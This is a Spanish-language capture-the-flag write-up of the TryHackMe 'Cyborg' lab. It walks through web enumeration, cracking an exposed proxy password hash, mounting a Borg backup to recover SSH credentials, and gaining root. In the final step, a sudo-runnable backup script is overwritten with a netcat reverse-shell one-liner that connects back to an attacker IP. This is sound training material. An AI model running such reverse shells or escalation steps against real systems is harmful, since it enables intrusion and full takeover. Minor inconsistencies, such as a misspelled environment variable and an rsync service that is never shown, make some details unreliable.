# 🤖 Write-up CTF: TryHackMe - Cyborg

## 📝 Introducción

Este es un write-up detallado para la máquina Cyborg de TryHackMe. Esta sala es un excelente ejercicio clasificado como de dificultad fácil/media que se enfoca en la enumeración de servicios no convencionales y la explotación de archivos de configuración desprotegidos.

El desafío principal radica en la identificación y el uso adecuado de la utilidad rsync para el acceso inicial y, posteriormente, en la escalada de privilegios para obtener acceso root.

El objetivo es documentar el proceso completo de enumeración, acceso inicial y escalada de privilegios hasta obtener las flags de user.txt y root.txt.

## 📍 Paso 1: Verificación de Conectividad (Ping)

El primer paso esencial en cualquier evaluación de seguridad es confirmar que la máquina objetivo está activa y accesible desde nuestro equipo atacante.

<img width="551" height="196" alt="Ping" src="https://github.com/user-attachments/assets/68a8a5ef-949a-48f5-b7dc-7a91f42f8c72" />


Comando:

Utilizamos la herramienta ping en nuestra máquina Kali Linux para enviar 4 paquetes ICMP a la dirección IP de la máquina Cyborg.
````
Bash

ping -c 4 10.10.170.250
````
Resultado:

La salida confirma que el host con la IP 10.10.170.250 está activo y respondiendo a las peticiones ICMP.

PING 10.10.170.250 (10.10.170.250) 56(84) bytes of data.

64 bytes from 10.10.170.250: icmp_seq=1 ttl=63 time=51.2 ms
[...]

--- 10.10.170.250 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 3013ms

rtt min/avg/max/mdev = 49.236/50.989/53.239/1.466 ms

✅ Conclusión del Paso 1: Con 0% de pérdida de paquetes, se confirma que la red está configurada correctamente y podemos proceder con la fase de enumeración activa.


## 🧭 Paso 2: Análisis del Servicio Web (HTTP)

Al navegar a la dirección http://10.10.170.250 en el navegador, se encuentra la página por defecto de un servidor web.

<img width="1123" height="759" alt="pagina puerto 80" src="https://github.com/user-attachments/assets/aa1f086b-8b41-4a6d-88c1-f4411b2cd513" />

Hallazgo:

La página de bienvenida de "Apache2 Ubuntu Default Page" confirma que un servidor HTTP está operativo en el puerto 80.

Análisis:

Tecnología: El servidor es Apache2 corriendo sobre Ubuntu.

Contenido: La página es la plantilla predeterminada (index.html) que indica que el administrador aún no ha reemplazado el contenido. Esto sugiere que, a priori, el puerto 80 no contiene la información clave para el acceso inicial.

## ⚓ Escaneo de Puertos

Si bien no se proporciona la salida completa de nmap, la práctica me indicó los puertos abiertos:

Puerto 22 (SSH): Servicio de acceso remoto.

Puerto 80 (HTTP): Servicio web.


## 🔍 Paso 3: Enumeración de Directorios (Gobuster)

Dado que la página principal del puerto 80 no contenía información útil, el siguiente movimiento lógico es realizar una fuerza bruta de directorios y archivos para descubrir contenido oculto o no enlazado.

📜 Ejecución de Gobuster

<img width="934" height="436" alt="gobuster" src="https://github.com/user-attachments/assets/e9e85b83-2f3c-441c-a6b3-eef8cc231650" />


Utilizamos la herramienta gobuster en modo dir para buscar directorios comunes usando una wordlist estándar (common.txt).

Comando:
````
Bash

gobuster dir -u http://10.10.170.250 -w /path/a/wordlists/dirb/common.txt -t 100
````
🎯 Hallazgos Clave

El escaneo de gobuster reveló varios recursos, pero los más relevantes que respondieron con un código distinto a 404/403 fueron:

Recurso	Estado HTTP	Análisis

/admin	301 (Moved Permanently)	Directorio que requiere ser investigado.

/etc	301 (Moved Permanently)	Directorio que requiere ser investigado (Inusual en web roots).

/index.html	200 (OK)	Página ya vista.

.htpasswd	403 (Forbidden)	Restringido.


Análisis de Resultados:

Los resultados más interesantes son las redirecciones (Status 301) a los directorios /admin y /etc.

/admin: Sugiere una posible interfaz de gestión o login.

/etc: Este es un directorio particularmente inusual de encontrar en un web root visible, ya que en sistemas Linux aloja archivos de configuración del sistema.


## 👨‍💻 Paso 4: Investigación del Directorio /admin

Siguiendo la pista de la redirección 301 (Moved Permanently) descubierta por Gobuster, el siguiente paso es navegar directamente al directorio /admin/.

<img width="1211" height="824" alt="pagina admin usuario Alex" src="https://github.com/user-attachments/assets/09baa20f-3ed3-487f-9c0b-bc1be075aac3" />


👤 Descubrimiento de Información Personal

Al acceder a http://10.10.170.250/admin/, se revela una página personal sobre "My music acheivements" (mis logros musicales).

Hallazgo Crítico:

Dentro de la sección "Setup" se encuentra una pieza de información crucial:

My name is Alex and im a music producer from The United Kingdom!

Análisis:

Identidad: Se ha revelado el nombre de un posible usuario del sistema: Alex.

Contexto: Aunque la página en sí no ofrece una vulnerabilidad directa (como un formulario de login o una LFI/RCE), la obtención de un nombre de usuario válido (alex) es vital para los ataques de fuerza bruta o de credenciales en servicios como SSH.

Guardamos la Credencial:

Hemos obtenido nuestro primer candidato a nombre de usuario: alex.


## 💬 Paso 5: Descubrimiento de Información Confidencial en Admin Shoutbox

Continuando con la enumeración del directorio /admin/, encontramos el archivo admin.html, que contiene una pizarra de mensajes internos ("Admin Shoutbox"). Este chat es una mina de oro de información y pistas.

<img width="1229" height="809" alt="chat interno con dos usuarios mas" src="https://github.com/user-attachments/assets/54e3c076-2521-4c44-8f21-fd8ee25ed39e" />


👥 Nuevos Usuarios y Confesiones

Nuevos Hallazgos de Usuarios:

Los mensajes revelan dos nombres de usuario adicionales que podríamos necesitar para el acceso por fuerza bruta:

Josh

Adam

La Pista Crítica (El Talón de Aquiles):

El mensaje final contiene una confesión de un error de configuración que es la clave para la vulnerabilidad de la máquina. Un usuario (posiblemente el administrador, por el contexto) escribe:

"Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier... in the meantime all the config files are laying about."

"...im pretty sure my backup music_archive is safe just to confirm."



## 📂 Paso 6: Exposición de Archivos de Configuración Críticos

La pista obtenida en el Admin Shoutbox sobre la exposición de los archivos de configuración se confirma al investigar el directorio /etc descubierto por Gobuster.

🗂️ Navegación al Directorio /etc

<img width="621" height="379" alt="directorio etc" src="https://github.com/user-attachments/assets/c54e1824-c5e5-4c56-a0a7-2375a2c493ca" />

Al acceder a http://10.10.170.250/etc/, se confirma que el directorio es navegable y lista su contenido:

Se encuentra la subcarpeta squid/, lo que está directamente relacionado con la mención del "squid proxy" en el chat interno del Paso 5.

🔑 Descubrimiento de Credenciales

<img width="686" height="360" alt="directorio squid" src="https://github.com/user-attachments/assets/4e506bf4-3c99-43fd-a12d-44f4ae8d9e34" />


Al navegar a la carpeta del proxy, http://10.10.170.250/etc/squid/, encontramos archivos de configuración sensibles:

squid.conf: El archivo de configuración principal del proxy Squid.

passwd: ¡Un archivo de contraseñas! Aunque es probable que contenga credenciales para el proxy y no para el acceso directo al sistema (SSH), el archivo passwd es un vector de ataque directo ya que contendrá un hash de contraseña.


## 🔐 Paso 7: Extracción y Análisis de Credenciales Críticas

Aprovechando la exposición del directorio /etc/squid/, procedemos a analizar los dos archivos clave para la autenticación del proxy y la obtención de credenciales.

⚙️ Análisis de squid.conf

<img width="689" height="213" alt="archivo squid conf" src="https://github.com/user-attachments/assets/24a23bdb-7e9d-421a-839f-c26d3bf8662b" />

Al acceder al archivo de configuración del proxy, confirmamos que el método de autenticación básica está activo y se enlaza directamente al archivo de contraseñas que acabamos de descubrir:

Línea clave: auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd

Confirmación: La autenticación utiliza el archivo /etc/squid/passwd.

💾 Extracción del Hash de passwd

<img width="678" height="173" alt="arhcivo passwd" src="https://github.com/user-attachments/assets/af8dca41-24f2-4edd-9770-3ffd90635bf7" />


Al acceder al archivo /etc/squid/passwd, se revela una credencial que es doblemente valiosa:

Usuario Encontrado: music_archive

Hash Encontrado: $apr1$BpZ.0.1m$f0qqPwhSOG50URu0VQTtn.

¡Doble Pista!

Este hallazgo es crucial por dos razones:

El nombre de usuario music_archive coincide exactamente con el nombre del share de backup (módulo RSYNC) que encontramos en el Paso 5. Esto sugiere fuertemente que esta credencial está destinada a la autenticación del servicio RSYNC (Puerto 873).

Tenemos un hash de contraseña (Apache MD5 / APR1) que podemos intentar crackear para obtener la clave de acceso.


## 💥 Paso 8: Cracking del Hash de Contraseña

Con el hash extraído en el paso anterior ($apr1$BpZ.0.1m$f0qqPwhSOG50URu0VQTtn.), el siguiente paso es utilizar una herramienta de cracking para obtener la contraseña en texto plano.

🔨 Ejecución de John The Ripper

Utilizamos la herramienta John the Ripper junto con la popular wordlist rockyou.txt para intentar crackear el hash.

<img width="862" height="251" alt="descifrnado el hash con john" src="https://github.com/user-attachments/assets/5b3015d7-bdee-4899-a7c9-503ec5e2a991" />


Comando:
````
Bash

# Guardamos el hash en un archivo llamado pass.txt
echo "music_archive:\$apr1\$BpZ.0.1m\$f0qqPwhSOG50URu0VQTtn." > pass.txt

# Ejecutamos John
john pass.txt --wordlist=/path/a/wordlists/rockyou.txt
````
Resultado:

¡Éxito! John the Ripper detecta y crackea el hash, revelando la contraseña en texto plano.


## 💾 Paso 9: Descarga del Archivo de Backup (Archive)

Dentro de la página /admin/admin.html, el menú desplegable Archive ofrece una opción de Download.

<img width="939" height="256" alt="seguimos enumeradno pag admin descarga" src="https://github.com/user-attachments/assets/48696da7-9997-4959-885d-b454929d0e2c" />


📦 Obtención del Archivo Comprimido

Al seleccionar la opción Download, se inicia la descarga de un archivo comprimido que presumiblemente contiene los backups o el archivo de configuración que el administrador mencionó haber dejado "por ahí tirado".

Acción:

Navegar a Admin → Archive → Download.

Hallazgo:

Obtenemos un archivo comprimido, probablemente archive.tar (o similar), que debemos analizar inmediatamente.


## 🔎 Paso 10: Análisis del Contenido del Backup (Borg)

Una vez descargado el archivo archive.tar, el siguiente paso es extraer su contenido y analizar los archivos para encontrar la siguiente pista o, idealmente, la flag del usuario.

📁 Extracción y Estructura de Archivos

Al extraer el archivo y navegar por la estructura de directorios, se descubre un conjunto de archivos con nombres peculiares.

<img width="627" height="261" alt="navego por la carpeta descargada" src="https://github.com/user-attachments/assets/71ae184b-25d2-4865-92cf-4fb5ff6a52ce" />


Navegación:
````
Bash

# Ejemplo de extracción y navegación
tar -xf archive.tar
cd /home/.../field/dev/final_archive/
````
Archivos Encontrados:

La carpeta contiene archivos como config, data, README, etc., lo que sugiere una estructura de repositorio.

🔑 Identificación de Borg Backup

Al leer el archivo README, se confirma el tipo de repositorio:

<img width="793" height="452" alt="leyendo archivos" src="https://github.com/user-attachments/assets/4fbf4cf7-ec39-4830-9d17-63216a263da7" />


This is a Borg Backup repository.

See https://borgbackup.readthedocs.io/

Análisis del Archivo config:

El archivo config de Borg Backup contiene metadatos y, lo más importante, una larga cadena bajo la etiqueta key. Esta es la clave de cifrado que se utiliza para proteger el repositorio de Borg.
````
[repository]
version = 1
[...]
key = hqLhbGDVcmL0aG2mc2hhMjU2pGRhdGhaA26ZS3pQjzX7NiYkZMTEyECo6f9mTSl09ZWFV [...]
````
🎯 Conclusión del Paso 10:

Hemos obtenido dos piezas de información esenciales:

La tecnología utilizada para el backup: Borg Backup.

La clave de cifrado (key) del repositorio de Borg.



## 🛠️ Paso 11: Preparación del Entorno (Instalación de Borg Backup)

Tras descubrir que el archivo de backup es un repositorio de Borg Backup y obtener su clave de cifrado, es indispensable instalar la herramienta cliente en nuestra máquina Kali para poder interactuar con el repositorio.

📚 Investigación y Documentación

<img width="859" height="300" alt="navego por el enlace de borg" src="https://github.com/user-attachments/assets/411f32a7-0a64-457b-9a24-18c895d5133c" />


Se consulta la documentación de Borg Backup para entender su funcionamiento y los requisitos de instalación.

BorgBackup (short: Borg) is a deduplicating backup program. Optionally, it supports compression and authenticated encryption.

💻 Instalación de la Herramienta Borg

<img width="772" height="294" alt="como instalar borg" src="https://github.com/user-attachments/assets/db66f407-3258-4ac6-8e76-b089e306c4f8" />


Es crucial instalar Borg y sus dependencias en la máquina atacante para poder manipular los archivos del repositorio de forma correcta.

Acción:

Se instalan los paquetes necesarios en la terminal de Kali Linux (a menudo dentro de un entorno virtual para mayor control).

<img width="811" height="32" alt="instalamos borgbackup" src="https://github.com/user-attachments/assets/dbb8207d-6b75-411c-a666-9e30c5353727" />

Comando (ejemplo):
````
Bash

# Instalación de Borg y dependencias clave
sudo apt install borgbackup
````
Una vez instalado, el entorno está preparado. Ahora podemos utilizar las credenciales crackeadas (Paso 8) y la clave de cifrado (Paso 10) para acceder al módulo de RSYNC y manipular el repositorio de Borg.


## 🔑 Paso 12: Configuración del Entorno (Passphrase de Borg)

Para poder desencriptar y extraer los archivos del repositorio de Borg Backup que descargamos, necesitamos suministrar la Passphrase correcta. 

La documentación de Borg sugiere usar una variable de entorno para este propósito, y la contraseña que crackeamos en el Paso 8 es, de hecho, la Passphrase del repositorio.

<img width="854" height="670" alt="comando para usar con la clave" src="https://github.com/user-attachments/assets/f98fe642-b118-4881-ac46-4454c2a9fb1e" />


📜 Configuración de la Passphrase

Utilizamos la contraseña obtenida por John the Ripper y la exportamos como una variable de entorno, siguiendo las recomendaciones de Borg. Esto permite que la herramienta acceda al repositorio sin solicitar la contraseña interactivamente.

<img width="572" height="90" alt="lo usamos con la clave obtenida" src="https://github.com/user-attachments/assets/2f8bd55b-00ca-4fe8-95a6-84b829d4ed4e" />

Acción:

Se establece la variable BORGBORG_PASSPHRASE con la contraseña en texto plano.

Comando:
````
Bash

# La contraseña crackeada es la Passphrase.
export BORGBORG_PASSPHRASE='[Contraseña_Crackeada]'
````


## 💾 Paso 13: Acceso y Montaje del Repositorio Borg

Con el entorno configurado (Paso 11) y la Passphrase establecida (Paso 12), podemos finalmente interactuar con el repositorio de Borg Backup que descargamos, lo que constituye la fase de acceso inicial.

🔍 Listado de Archivos del Repositorio

<img width="1038" height="118" alt="listamos los archivos dentro de borg" src="https://github.com/user-attachments/assets/cc40e7eb-3345-49ff-9d05-3c6ba33b96c4" />

El primer comando confirma que el repositorio está intacto y que el nombre de la archive principal es, efectivamente, music_archive.

Comando:
````
Bash

borg list .
````
Resultado:
````
music_archive   Tue, 2020-12-29 15:00:38 [...]
````
🗄️ Montaje del Repositorio

Para acceder al contenido del backup como si fuera un sistema de archivos normal, utilizamos la función de montaje de Borg, especificando un directorio temporal (/tmp/pe en este caso).

<img width="764" height="63" alt="monto el repo dentor tmp" src="https://github.com/user-attachments/assets/a27b59d0-2970-4848-9351-47c8aa3c8808" />


Comando:
````
Bash

borg mount . /tmp/pe
````
Una vez que se ingresa la Passphrase (la contraseña crackeada), el repositorio se monta con éxito.


## 🚪 Paso 14: Enumeración Post-Acceso y Obtención de Credenciales de alex

Una vez montado el repositorio de Borg, podemos navegar por el backup del sistema como si fuera un sistema de archivos normal. El objetivo es encontrar la flag de usuario y, lo más importante, el vector para la escalada de privilegios a root.

🏠 Navegación al Directorio Home

<img width="661" height="449" alt="dentro del home de alex" src="https://github.com/user-attachments/assets/0f87ea99-d4a2-44cd-89c0-3bef59c44b76" />

Navegamos a través del repositorio montado, siguiendo la estructura del sistema operativo:

Bash
````
cd /tmp/pe/music_archive/home/alex/
````

Dentro del directorio /home/alex, encontramos la estructura de carpetas de un usuario común (Desktop, Documents, etc.).

📝 Descubrimiento de Credenciales (note.txt)

La enumeración de las carpetas personales de Alex revela la clave para nuestro siguiente paso en la escalada:

Desktop: Contiene un archivo inocuo (secret.txt).

<img width="661" height="175" alt="dentro de desktop archivo secret" src="https://github.com/user-attachments/assets/6fc52f33-c7b3-47f6-9290-6bdda91f55fd" />

Documents: Contiene un archivo crucial: note.txt.

<img width="797" height="216" alt="dentro del Documents arhivo note" src="https://github.com/user-attachments/assets/7fbf61cc-539f-4b38-aa1d-22606eedc5bc" />


Al examinar el contenido de note.txt, encontramos una confesión y una nueva credencial:

Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:$[CLAVE_DE_ALEX]

Hallazgo Crítico:

Hemos obtenido la contraseña del usuario del sistema alex. Esta contraseña, nos proporcionará acceso directo a la máquina vía SSH (Puerto 22), permitiéndonos iniciar la escalada de privilegios in-place.


## 💻 Paso 15: Acceso al Sistema (SSH) y Obtención de la Flag de Usuario

La fase de obtención de credenciales ha culminado. Con la contraseña de alex extraída en el Paso 14, obtenemos acceso al sistema a través de SSH.

🔑 Cracking y Conexión SSH


Una vez con la contraseña obtenida en el archivo note.txt, se establece la conexión al servicio SSH (Puerto 22).

<img width="678" height="437" alt="usamos ssh para entrar a la maquina " src="https://github.com/user-attachments/assets/3065643d-a06d-4304-a64c-b09a60e4dae1" />


Comando:
````
Bash

ssh alex@10.10.170.250
````
Resultado:

La conexión es exitosa, lo que nos da nuestra primera shell en la máquina Cyborg como el usuario alex.

🚩 Obtención de user.txt

Una vez dentro de la máquina como alex, el primer objetivo es encontrar el archivo user.txt, el cual está ubicado en el directorio home del usuario.

<img width="636" height="522" alt="flag user" src="https://github.com/user-attachments/assets/cad208d3-82ab-4af6-973f-c665a242c4d9" />

Comando:
````
Bash

ls -la
cat user.txt
````
¡Flag de Usuario Obtenida!


## 🚀 Paso 16: Enumeración para Escalada de Privilegios

Una vez que hemos obtenido la shell como el usuario alex (Paso 15), el primer paso en la escalada de privilegios es verificar qué comandos puede ejecutar este usuario con permisos de superusuario (sudo).

🧐 Verificación de Permisos sudo

Utilizamos el comando sudo -l para listar los comandos que el usuario alex puede ejecutar como cualquier otro usuario o grupo (o ALL), y, crucialmente, si requiere o no contraseña (NOPASSWD).

<img width="1054" height="107" alt="privilegios alex " src="https://github.com/user-attachments/assets/6c9f4702-c027-40f7-931a-c96451473a1d" />


Comando:
````
Bash

sudo -l
````
Hallazgo Crítico:

El resultado revela una entrada crítica para la escalada:

User alex may run the following commands on ubuntu:

(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

Esto significa que alex puede ejecutar el script /etc/mp3backups/backup.sh como root sin necesidad de contraseña. Este es el vector de escalada.

📜 Análisis del Script backup.sh

El siguiente paso es examinar el contenido del script para identificar cómo puede ser manipulado para ejecutar comandos arbitrarios como root.

<img width="1077" height="806" alt="leemos el script de bash" src="https://github.com/user-attachments/assets/3283fcf9-c172-47a1-ab0d-7fcf863a3e94" />

Comando:
````
Bash

cat /etc/mp3backups/backup.sh
````

Si el script no tiene un clean-up adecuado y el OPTARG se puede manipular o si el flag no se establece, el script ejecutará el valor de la variable de entorno $command (o similar), o permitirá que se le pase un argumento que se ejecuta como root.

🎯 Próxima Acción: Explotar el permiso NOPASSWD en el script. Si logramos pasar un comando de reverse shell o el comando para leer la flag al final del script, lo ejecutaremos como root.


## 💥 Paso 17: Escalada de Privilegios por Inyección de Script (Root)

Hemos identificado que el usuario alex puede ejecutar el script /etc/mp3backups/backup.sh como root sin contraseña (Paso 16). 

<img width="668" height="257" alt="enumeramos directorio mp3backups" src="https://github.com/user-attachments/assets/c5515122-0dde-437d-be2e-e49112112b98" />


El método de escalada en este caso es la modificación directa del script para inyectar un comando de reverse shell, aprovechando que alex tiene permisos para modificar o ejecutar chmod en el archivo.

📝 Modificación e Inyección del Payload

Aunque el script se ejecuta como root, alex (el propietario) tiene permisos suficientes para modificar su contenido, lo que nos permite inyectar un payload malicioso.

Habilitar Escritura (Implícito): Aseguramos los permisos de escritura sobre el script.
````
Bash

alex@ubuntu:/etc/mp3backups$ chmod +w backup.sh
````
Inyección del Reverse Shell: Sobrescribimos el script con un comando que intenta conectarse a nuestra máquina atacante (10.11.147.155 en el ejemplo, Puerto 4444) y nos devuelve una shell de root.
````
Bash

alex@ubuntu:/etc/mp3backups$ echo "mkfifo /tmp/lol;nc 10.11.147.155 4444 </tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol" > backup.sh
````

<img width="1019" height="143" alt="inicamos shell inverso" src="https://github.com/user-attachments/assets/8ae1dc92-08f6-408a-8c01-54945ed613ed" />

🎧 Ejecución y Obtención de Shell de Root

<img width="588" height="298" alt="habilitamos escuha nc, y obtenemos la flag root" src="https://github.com/user-attachments/assets/09c2e347-6265-4ac2-840a-c18db383a6b3" />


En la Máquina Atacante (Kali):

Preparamos un listener de Netcat en el puerto especificado para capturar la conexión inversa.
````
Bash

nc -nvlp 4444
````
En la Máquina Objetivo (Cyborg):

Ejecutamos el script comprometido utilizando sudo. Dado que tiene la directiva NOPASSWD, se ejecuta instantáneamente como root.
````
Bash

alex@ubuntu:/etc/mp3backups$ sudo /etc/mp3backups/backup.sh
````

¡Conexión de Root Establecida!

El listener de Netcat recibe la conexión, y al verificar los permisos con whoami, se confirma que la shell es de root.

🚩 Obtención de root.txt

Dentro de la shell de root, simplemente navegamos al directorio /root para obtener la flag final.

Comandos:
````
Bash

whoami
cd /root
ls
cat root.txt
````

¡Flag de Root Obtenida!
